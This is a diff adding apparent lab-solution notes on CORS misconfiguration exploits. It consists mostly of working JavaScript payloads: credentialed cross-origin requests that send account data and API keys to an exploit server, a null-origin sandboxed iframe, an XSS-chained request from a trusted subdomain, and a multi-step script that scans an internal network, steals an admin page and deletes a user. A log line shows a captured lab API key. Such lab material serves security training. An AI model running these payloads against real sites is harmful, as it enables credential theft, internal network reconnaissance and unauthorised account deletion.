@@ -1,0 +1,140 @@
+Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains. 
+
+1. CORS vulnerability with basic origin reflection
+
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','$url/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script> 
+
+2. this is null origin
+
+	Origin: null
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+   var req = new XMLHttpRequest ();
+   req.onload = reqListener;
+   req.open('get','$url/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe> 
+
+3.
+
+	when you will enforce mitm attack to the victim by sending malicious script you can find out the 
+	api key
+	172.31.30.203   2020-12-23 01:41:55 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22uCDOIh1oCx8WYQ7KUr722kSjqhwSUGho%22} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+
+	<script>
+   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script> 
+
+4.
+
+ First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
+
+<script>
+var q = [], collaboratorURL = 'http://$collaboratorPayload';
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(wait){
+    fetchUrl(url,wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+for(i=1;i<=20;i++){
+  if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait){
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+  }
+  ))
+  .catch(e => {
+  if(q.length) {
+    q.shift()(wait);
+  }
+  });
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()(wait);
+  }
+  }, wait);
+}
+</script>
+
+Step 2
+
+Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+  }
+  ))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+
+Step 3
+
+Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+  }
+  ))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+
+Step 4
+
+Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+  }
+  ))
+}
+
+fetchUrl("http://$ip");
+</script>
+
+Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab. 
